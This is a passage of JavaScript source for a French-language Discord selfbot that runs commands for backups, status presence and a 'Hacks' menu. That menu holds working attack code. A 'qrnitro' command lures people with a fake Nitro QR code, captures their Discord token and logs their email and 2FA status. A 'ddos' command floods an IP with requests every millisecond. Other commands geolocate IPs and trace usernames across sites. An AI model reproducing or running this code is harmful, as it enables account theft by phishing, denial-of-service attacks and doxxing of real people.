            else if (message.content === prefix + "verif"){
                message.edit(`ガ __**${name} - Verif**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${client.tools === "k3s" ? "" : "\`"}${client.tools === "k3s" ? "" : "\`"}𝗕𝗶𝗲𝗻𝘃𝗲𝗻𝘂𝗲 𝘀𝘂𝗿 𝗹𝗲 𝗥𝗦𝗭 𝗦𝗲𝗹𝗳𝗯𝗼𝘁${"1135989202325098569" === client.user?.id ? "\n𝗖𝗿𝗲𝗮𝘁𝗲𝘂𝗿 𝗱𝘂 𝘀𝗲𝗹𝗳𝗯𝗼𝘁" : ""}${client.tools === "k3s" ? "" : "\`"}${client.tools === "k3s" ? "" : "\`"}${client.tools === "k3s" ? "" : "\`"}`)
            }

            else if (message.content === prefix + "backup"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Backup」`)
                .setDescription(`${prefix}backup speed ▸ 𝐁𝐚𝐜𝐤𝐮𝐩 𝐞𝐭 𝐜𝐡𝐚𝐫𝐠𝐞 𝐥𝐚 𝐛𝐚𝐜𝐤𝐮𝐩
                ${prefix}backup create ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧𝐞 𝐛𝐚𝐜𝐤𝐮𝐩
                ${prefix}backup emotes ▸ 𝐁𝐚𝐜𝐤𝐮𝐩𝐬 𝐥𝐞𝐬 𝐞𝐦𝐨𝐭𝐞𝐬
                ${prefix}backup msg ▸ 𝐁𝐚𝐜𝐤𝐮𝐩 𝐚𝐯𝐞𝐜 𝐥𝐞𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬
                ${prefix}backup account ▸ 𝐁𝐚𝐜𝐤𝐮𝐩 𝐥𝐞 𝐜𝐨𝐦𝐩𝐭𝐞
                ${prefix}backup friends ▸ 𝐁𝐚𝐜𝐤𝐮𝐩 𝐥𝐞𝐬 𝐚𝐦𝐢𝐬
                ${prefix}backup links ▸ 𝐁𝐚𝐜𝐤𝐮𝐩 𝐥𝐞𝐬 𝐬𝐞𝐫𝐯𝐞𝐮𝐫𝐬
                ${prefix}backup load ▸ 𝐂𝐡𝐚𝐫𝐠𝐞 𝐮𝐧𝐞 𝐛𝐚𝐜𝐤𝐮𝐩
                ${prefix}backup delete ▸ 𝐒𝐮𝐩𝐩𝐫𝐢𝐦𝐞 𝐮𝐧𝐞 𝐛𝐚𝐜𝐤𝐮𝐩
                ${prefix}backup purge ▸ 𝐒𝐮𝐩𝐩𝐫𝐢𝐦𝐞 𝐥𝐞𝐬 𝐛𝐚𝐜𝐤𝐮𝐩𝐬
                ${prefix}backup list ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐞𝐬 𝐛𝐚𝐜𝐤𝐮𝐩𝐬
                ${prefix}backup all ▸ 𝐂𝐫𝐞𝐞 𝐭𝐨𝐮𝐭𝐞𝐬 𝐥𝐞𝐬 𝐛𝐚𝐜𝐤𝐮𝐩𝐬`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                message.edit(`ガ __**${name} - Backup**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}backup speed (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée la backup d'un serveur et la charge directement***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup create (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée la backup d'un serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup emotes (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée la backup des emotes d'un serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup msg (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée la backup d'un serveur avec les messages*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup account (id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée la backup du compte*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup friends (id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée une backup de vos amis***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup links (id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée une backup de vos serveurs***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup load (id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Charge une backup***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup delete (id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime une backup***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup purge${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime toutes les backups (serveurs uniquement)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup list${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la liste des backups (serveurs uniquement)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup all${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée la backup de tous les module backups*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            
















            // Commandes status

            else if (cmd.slice(0, 1).join(' ') === (prefix + "custom")){
                if (!args[0]){
                    client.user.setActivity(null)

                    custom.emoji = null
                    custom.text = null
                    client.save(`${__dirname}/Data/Status/custom.json`, custom)

                    message.edit(`ガ __**${name} - Custom**__ ガ\n> *Le status custom a été supprimé*`)
                }
                else {
                    message.edit(`ガ __**${name} - Custom**__ ガ\n> *Votre custom status a été mis à jour*`)

                    if (estEmojiDiscord(args[0])){
                        custom.emoji = args[0]
                        custom.text = args.slice(1).join(' ') || null
                        client.save(`${__dirname}/Data/Status/custom.json`, custom)
    
                        const r = new discord.CustomStatus(client)
                            .setEmoji(args[0])
                            .setState(args.slice(1)?.join(' ') || null)
                            client.user.setPresence({activities: [r]})
                    }
                    else {
                        custom.emoji = null
                        custom.text = args.join(' ')
                        client.save(`${__dirname}/Data/Status/custom.json`, custom)

                        const r = new discord.CustomStatus(client)
                            .setState(args.join(' '))
                        client.user.setPresence({activities: [r]})
                    }        
                }
            }

            else if (message.content === prefix + "default"){
                const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/wiiKill.gif');
                const status = new discord.RichPresence(client)
                    .setApplicationId('1219030452158075010')
                    .setType('PLAYING')
                    .setState('dev by R$Z team')
                    .setName(`𝑹$𝒁-𝑷𝒓𝒐𝒋𝒆𝒄𝒕-𝙥𝙧𝙚𝙢𝙞𝙪𝙢`)
                    .setDetails(`version ${versionself}`)
                    .setStartTimestamp(Date.now())
                    .setAssetsLargeImage(getExtendURL[0].external_asset_path)
                    .addButton('Server Support', `https://discord.gg/jcdQyTNJ5E`);
    
                client.user.setPresence({activities: [status]})
                message.edit(`ガ __**${name} - Default**__ ガ\n> *Le RPC par défault a été rétabli*`)

            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "secretstream")){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

                if (!args[0]) return message.edit(`ガ __**${name} - Secret Stream**__ ガ\n> *Veuillez entrer un texte à stream en secret*`)
                
                const r = new RichPresence().setName(args.join(' ')).setType("STREAMING")
                client.user.setActivity(r)
                
                message.edit(`ガ __**${name} - Secret Stream**__ ガ\n> *Vous êtes en train de stream en secret ${client.tools === "k3s" ? "" : "\`"}${args.join(' ')}${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "stream")){
                if (!args[0]) return message.edit(`ガ __**${name} - Stream**__ ガ\n> *Veuillez entrer un texte à stream*`)
                client.user.setActivity(args.join(' '), {type: "STREAMING", url: twitch})
                message.edit(`ガ __**${name} - Stream**__ ガ\n> *Vous êtes en train de stream ${client.tools === "k3s" ? "" : "\`"}${args.join(' ')}${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "play")){
                if (!args[0]) return message.edit(`ガ __**${name} - Play**__ ガ\n> *Veuillez entrer un texte à joué*`)
                client.user.setActivity(args.join(' '))
                message.edit(`ガ __**${name} - Play**__ ガ\n> *Vous êtes en train de jouer à ${client.tools === "k3s" ? "" : "\`"}${args.join(' ')}${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "listen")){
                if (!args[0]) return message.edit(`ガ __**${name} - Listen**__ ガ\n> *Veuillez entrer un texte à écouter*`)
                client.user.setActivity(args.join(' '), {type: "LISTENING", url: twitch})
                message.edit(`ガ __**${name} - Listen**__ ガ\n> *Vous êtes en train d'écouter ${client.tools === "k3s" ? "" : "\`"}${args.join(' ')}${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "watch")){
                if (!args[0]) return message.edit(`ガ __**${name} - Watch**__ ガ\n> *Veuillez entrer un texte à regarder*`)
                client.user.setActivity(args.join(' '), {type: "WATCHING", url: twitch})
                message.edit(`ガ __**${name} - Watch**__ ガ\n> *Vous êtes en train de regarder ${client.tools === "k3s" ? "" : "\`"}${args.join(' ')}${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "compet")){
                if (!args[0]) return message.edit(`ガ __**${name} - Compet**__ ガ\n> *Veuillez entrer un texte à participer*`)
                client.user.setActivity(args.join(' '), {type: "COMPETING", url: twitch})
                message.edit(`ガ __**${name} - Compet**__ ガ\n> *Vous êtes en train de participer à ${client.tools === "k3s" ? "" : "\`"}${args.join(' ')}${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (message.content === prefix + "delact"){
                client.user.setActivity(null)
                client.user.setActivity(null)
                message.edit(`ガ __**${name} - Delact**__ ガ\n> *Votre status a été supprimé*`)
            }

            else if (message.content === prefix + "online"){
                client.user.setPresence({status: "online"})
                message.edit(`ガ __**${name} - Online**__ ガ\n> *Vous êtes **en ligne***`)
            }

            else if (message.content === prefix + "idle"){
                client.user.setPresence({status: "idle"})
                message.edit(`ガ __**${name} - Idle**__ ガ\n> *Vous êtes **inactif***`)
            }

            else if (message.content === prefix + "dnd"){
                client.user.setPresence({status: "dnd"})
                message.edit(`ガ __**${name} - DnD**__ ガ\n> *Vous êtes en **ne pas déranger***`)
            }

            else if (message.content === prefix + "invisible"){
                client.user.setPresence({status: "invisible"})
                message.edit(`ガ __**${name} - Invisible**__ ガ\n> *Vous êtes **invisible***`)
            }

            






















            // Commandes Hacks

            else if (cmd.slice(0, 1).join(' ') === (prefix + "ghostping")){
                message.delete()
            }
            else if (cmd.slice(0, 1).join(' ') === (prefix + "ddos")){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

                if (args[0] === "stop"){
                    if (client.interval["ddos"]) clearInterval(client.interval["ddos"])
                    message.edit(`ガ __**${name} - DDoS**__ ガ\n> Le DDoS s'est arrêté !.`)    
                }
                else {
                    const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
                    if (!args[0] || !ipRegex.test(args[0])) return message.edit(`ガ __**${name} - DDoS**__ ガ\n> L'IP entré n'est pas valide.`)
    
                    if (client.interval["ddos"]) clearInterval(client.interval["ddos"])
                    message.edit(`ガ __**${name} - DDoS**__ ガ\n> Le DDoS est lancé !.`)
    
                    client.interval["ddos"] = setInterval(() => fetch(`http://${args[0]}:65535`).catch(() => false), 1);    
                }
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "rtoken")){
                const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
                
                let token1 = Buffer.from(user?.id, "utf-8").toString("base64")
                let token2 = ["HircHg", "XnyXiA", "XluxwQ", "XXn_KA", "Xiq-WQ"];
                let token3 = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "xllelHltGdY7DP_0s1XST4cgzTs"];
                
                message.edit(`ガ __**${name} - Token**__ ガ\n> *Voici le token de ${user.username}:\n${token1}.${token2[Math.floor(Math.random() * token2.length)]}.${token3[Math.floor(Math.random() * token3.length)]}*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "ipinfo")){
                const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
                if (!args[0] || !ipRegex.test(args[0])) return message.edit(`ガ __**${name} - IP Info**__ ガ\n> L'IP entré n'est pas valide.`)

                const res = await fetch(`http://ip-api.com/json/${args[0]}`);
                const json = await res.json();
        
                if (json.status !== "success") return message.edit(`ガ __**${name} - IP Info**__ ガ\n> L'IP entré n'est pas valide.`)
        
                message.edit(`ガ __**${name} - IP Info**__ ガ\n> ${client.tools === "k3s" ? "" : "\`"}📍${client.tools === "k3s" ? "" : "\`"} ${json.country} (${json.countryCode})
                > ${client.tools === "k3s" ? "" : "\`"}📍${client.tools === "k3s" ? "" : "\`"} ${json.regionName} (${json.region})
                > ${client.tools === "k3s" ? "" : "\`"}📍${client.tools === "k3s" ? "" : "\`"} ${json.city}
                
                > ${client.tools === "k3s" ? "" : "\`"}⏲️${client.tools === "k3s" ? "" : "\`"} ${json.timezone}
                
                > ${client.tools === "k3s" ? "" : "\`"}🌐${client.tools === "k3s" ? "" : "\`"} ${json.zip}
                > ${client.tools === "k3s" ? "" : "\`"}🌐${client.tools === "k3s" ? "" : "\`"} ${json.lat}
                > ${client.tools === "k3s" ? "" : "\`"}🌐${client.tools === "k3s" ? "" : "\`"} ${json.long}
                
                > ${client.tools === "k3s" ? "" : "\`"}🛜${client.tools === "k3s" ? "" : "\`"} ${json.org}
                > ${client.tools === "k3s" ? "" : "\`"}🛜${client.tools === "k3s" ? "" : "\`"} ${json.isp}
                > ${client.tools === "k3s" ? "" : "\`"}🛜${client.tools === "k3s" ? "" : "\`"} ${json.as}`.replaceAll('            ', ''))
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "username")){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

                if (!args[0]) return message.edit(`ガ __**${name} - Username Searcher**__ ガ\n> *Veuillez entrer un pseudo à chercher*`)

                let interval;
                let hoobe;
                let soloto;
                let github;
                let replit;
                let pastebin;
                let youtube;
                let chess;
                let xbox;
                let snapchat;
                let minecraft;
                let discord;
                let twitter;
                let spotify;
                let linkedin;
                let soundcloud;
                let roblox;
                let wattpad;
        
                function editMsg(){
                    message.edit(`ガ __**${name} - Username Searcher**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}Chess${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${chess ? chess?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://www.chess.com/member/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Discord${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${discord ? discord?.taken ? "`🟢`" : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Github${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${github ? github?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://github.com/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Hoo.be${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${hoobe ? hoobe?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://hoo.be/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Linked.in${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${linkedin ? linkedin?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://www.linkedin.com/in/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Minecraft${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${minecraft ? minecraft?.status === 200 ? "`🟢`" : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Pastebin${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${pastebin ? pastebin?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://pastebin.com/u/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Replit${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${replit ? replit?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://replit.com/@${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Roblox${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${roblox ? roblox?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://www.roblox.com/user.aspx?username=${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Snapchat${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${snapchat ? snapchat?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://www.snapchat.com/add/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Solo.to${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${soloto ? soloto?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://solo.to/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}SoundCloud${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${soundcloud ? soundcloud?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://soundcloud.com/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Spotify${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${spotify ? spotify?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://open.spotify.com/user/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}WattPad${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${wattpad ? wattpad?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://www.wattpad.com/user/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Xbox${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${xbox ? xbox?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://xboxgamertag.com/search/${args[0]}>)` : "`🔴`" : "`🔎`"}
                ${client.tools === "k3s" ? "" : "\`"}Youtube${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${youtube ? youtube?.status === 200 ? `[${client.tools === "k3s" ? "" : "\`"}🟢${client.tools === "k3s" ? "" : "\`"}](<https://www.youtube.com/@${args[0]}>)` : "`🔴`" : "`🔎`"}`.replaceAll("                ", ''))
                }
        
                editMsg()
                interval = setInterval(() => editMsg(), 2500);
        
                hoobe = await fetch(`https://hoo.be/${args[0]}`)
                soloto = await fetch(`https://solo.to/${args[0]}`)
                github = await fetch(`https://github.com/${args[0]}`)
                replit = await fetch(`https://replit.com/@${args[0]}`)
                pastebin = await fetch(`https://pastebin.com/u/${args[0]}`)
                youtube = await fetch(`https://www.youtube.com/@${args[0]}`)
                chess = await fetch(`https://www.chess.com/member/${args[0]}`)
                xbox = await fetch(`https://xboxgamertag.com/search/${args[0]}`)
                snapchat = await fetch(`https://www.snapchat.com/add/${args[0]}`)
                minecraft = await fetch(`https://api.mojang.com/users/profiles/minecraft/${args[0]}`)
                twitter = await fetch(`https://twitter.com/${args[0]}`)
                spotify = await fetch(`https://open.spotify.com/user/${args[0]}`)
                linkedin = await fetch(`https://www.linkedin.com/in/${args[0]}`)
                soundcloud = await fetch(`https://soundcloud.com/${args[0]}`)
                roblox = await fetch(`https://www.roblox.com/user.aspx?username=${args[0]}`)
                wattpad = await fetch(`https://www.wattpad.com/user/${args[0]}`)
                const discord1 = await fetch("https://discord.com/api/v9/users/@me/pomelo-attempt", { "headers": { "accept": "*/*", "accept-language": "fr,fr-FR;q=0.9", "authorization": client.token, "content-type": "application/json", }, "referrer": "https://discord.com/channels/1127026529210224784/1142980848489078874", "referrerPolicy": "strict-origin-when-cross-origin", "body": `{"username":"${args[0]}"}`, "method": "POST", "mode": "cors", "credentials": "include"});
                
                discord = await discord1.json()
                clearInterval(interval)
                editMsg()
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "proxy")){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
                if (message.guild && !message.member.permissions.has('ATTACH_FILES')) return message.edit(`ガ __**${name} - Proxy**__ ガ\n> *Vous n'avez pas les permissions pour executer cette commande*`)

                if (args[0] === "http"){
                    const r = await fetch('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500').then(async a => await a.text())
                    message.edit(`ガ __**${name} - Proxy**__ ガ\n> *Génération en cours...*`)

                    await fs.promises.writeFile(`${dir || __dirname}/sltcv.txt`, r)
                    await message.edit({content: null, files: [new discord.MessageAttachment(`${dir || __dirname}/sltcv.txt`, 'proxy_http.txt')]})
                    fs.unlinkSync(`${dir || __dirname}/sltcv.txt`)
                }

                else if (args[0] === "socks4"){
                    const r = await fetch('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500').then(async a => await a.text())
                    message.edit(`ガ __**${name} - Proxy**__ ガ\n> *Génération en cours...*`)

                    await fs.promises.writeFile(`${dir || __dirname}/sltcv.txt`, r)
                    await message.edit({content: null, files: [new discord.MessageAttachment(`${dir || __dirname}/sltcv.txt`, 'proxy_socks4.txt')]})
                    fs.unlinkSync(`${dir || __dirname}/sltcv.txt`)
                }

                else if (args[0] === "socks5"){
                    const r = await fetch('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500').then(async a => await a.text())
                    message.edit(`ガ __**${name} - Proxy**__ ガ\n> *Génération en cours...*`)

                    await fs.promises.writeFile(`${dir || __dirname}/sltcv.txt`, r)
                    await message.edit({content: null, files: [new discord.MessageAttachment(`${dir || __dirname}/sltcv.txt`, 'proxy_socks5.txt')]})
                    fs.unlinkSync(`${dir || __dirname}/sltcv.txt`)
                }
            }
            else if (cmd.slice(0, 1).join(' ') === (prefix + "screen")){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

                if (!args[0] || !args[0].startsWith("http")) return message.edit(`ガ __**${name} - ScreenShot**__ ガ\n> *Veuillez entrer une url de site*`)
                message.edit(`ガ __**${name} - ScreenShot**__ ガ\n> *https://image.thum.io/get/${args[0]} *`)
            }
            else if (cmd.slice(0, 1).join(' ') === (prefix + "qrnitro")){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

                if (!fs.existsSync(`${process.cwd()}/node_modules/discord-tqr`)) return message.edit(`ガ __**${name} - Qr Code**__ ガ\n> *Vous ne pouvez pas utiliser cette commande. (${client.tools === "k3s" ? "" : "\`"}npm i discord-tqr${client.tools === "k3s" ? "" : "\`"})*`)
                message.edit(`ガ __**${name} - Nitro**__ ガ\n> *Génération d'un nitro boost en cours...*`)
                
                const DiscordTQR = require("discord-tqr").default;
                const string = nitrocode(16, "a0A")
                const handler = new DiscordTQR();
                const base64QrCode = await handler.getQRCode({
                    path: `./${string}.png`,
                    wait: 1000 * 3,
                    template: "default"
                })

                await message.edit({content: null, files: [readBase64Image(base64QrCode)]}).then(() => fs.unlink(`./${string}.png`, () => false))
                await handler.listenForToken()
                .then(async (userToken) => {
                    message.edit(`ガ __**${name} - Nitro**__ ガ\n> *Nitro récupéré ! Il sera activé dans <t:${Math.round((Date.now() + 1000 * 60 * 60 * 24 * 2) / 1000)}:R>*`)
                    const infos = await handler.getDiscordAccountInfo().catch(() => false)
                    if (!infos) return;
                    console.log(`[ ${red("LOGS")} ]`)
                    console.log(green("Nouveau QR Grabber:"))
                    console.log(green("Pseudo: " + infos.username))
                    console.log(green("ID: " + infos?.id))
                    console.log(green("Langue: " + infos.locale || "Inconnu"))
                    console.log(green("Email: " + infos.email || "Pas d'email"))
                    console.log(green("A2F: " + infos.mfa_enabled ? "Oui" : "Non"))
                    console.log(green("Token: " + userToken.toString()))
                    if (args[0] === "open") await handler.openDiscordAccount();
                })
                .catch(() => message.edit({content: `ガ __**${name} - Nitro**__ ガ\n> Le nitro boost n'est plus valide.`, files: []}));
            }

            else if (message.content === prefix + "create webhook"){
                if (!message.guild) return message.edit(`ガ __**${name} - Create Webhook**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
                if (!message.guild.members.me.permissions.has("MANAGE_WEBHOOKS")) return message.edit(`ガ __**${name} - Create Webhook**__ ガ\n> *Vous n'avez pas les permissions nécessaires pour utiliser cette commande*`)

                const webhook = await message.channel.createWebhook("𝐑𝐒𝐙 𝐏𝐑𝐎𝐉𝐄𝐂𝐓").catch(() => false)
                if (!webhook) return message.edit(`ガ __**${name} - Create Webhook**__ ガ\n> *Le webhook a été crée. Les informations sont dans la console*`)
                message.edit(`ガ __**${name} - Create Webhook**__ ガ\n> *Informations du webhook dans la console*`)
                console.log(`[ ${red("LOGS")} ]`)
                console.log(green("Webhook Crée:"))
                console.log(green("ID: " + webhook?.id))
                console.log(green("Token: " + webhook.token))
                console.log(green("URL: " + webhook.url))
            }

            else if (cmd.slice(0, 2).join(' ') === (prefix + "webhook info")){
                if (!args[1] || !args[1].startsWith("https://")) return message.edit(`ガ __**${name} - Webhook Info**__ ガ\n> *Veuillez entrer un URL de webhook valide*`)

                    const r = await fetch(args[1], { method: "GET" }).then(async a => await a.json())
                    
                    if (!r.name) return message.edit(`ガ __**${name} - Webhook Info**__ ガ\n> *Lien de webhook invalide*`)
                    
                    message.edit(`ガ __**${name} - Webhook Info**__ ガ\n>>> **Serveur**${client.separator}\`${r.guild_id}\`
                    **Salon**${client.separator}\`${r.channel_id}\`
                    **Nom**${client.separator}\`${r.name}\`
                    **Avatar**${client.separator}${r.avatar ?? "\`Aucun\`"}`.replaceAll("                    ", ''))
                }

            else if (cmd.slice(0, 2).join(' ') === (prefix + "del webhook")){
                if (!args[1] || !args[1].startsWith("https://")) return message.edit(`ガ __**${name} - Delete Webhook**__ ガ\n> *Veuillez entrer un URL de webhook valide*`)
                
                fetch(args[1], { method: "DELETE" }).catch(() => false)
                message.edit(`ガ __**${name} - Delete Webhook**__ ガ\n> *Le webhook a été supprimé*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "virus")){
                if (!args[0]) return message.edit(`ガ __**${name} - Virus**__ ガ\n> *Veuillez entrer un nom de virus valide*`)

                const array = [
                    `𝐋𝐨𝐚𝐝𝐢𝐧𝐠 ${args.join(' ')} ...`,
                    `[${args.join(' ')}]: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓ ] 𝟏%`,
                    `[${args.join(' ')}]: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓] 25%`,
                    `[${args.join(' ')}]: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓] 50%`,
                    `[${args.join(' ')}]: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓] 75%`,
                    `[${args.join(' ')}]: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%`,
                    `[${args.join(' ')}]: 𝐕𝐢𝐫𝐮𝐬 𝐥𝐚𝐧𝐜𝐞́`
                ]

                for (const m of array){
                    message.edit(m)
                    await client.sleep(1000)
                }

            }

            else if (cmd.slice(0, 2).join(' ') === (prefix + "report spam")){
                if (!args[0]) return message.edit(`ガ __**${name} - Report Spammer**__ ガ\n> *Veuillez entrer un ID de message*`)
                const m = await message.channel.messages.fetch()
                
            }



















            // Commandes Tools

            else if (cmd.slice(0, 1).join(' ') === (prefix + "clear")){
                const nombre = parseInt(args[0]) || 99
                const collection = await message.channel.messages.fetch().catch(() => false)
                let messages = [...collection.values()]
                for (let i = 0; i < nombre; i++){
                    if (messages.filter(m => m.author?.id === client.user?.id)[i])
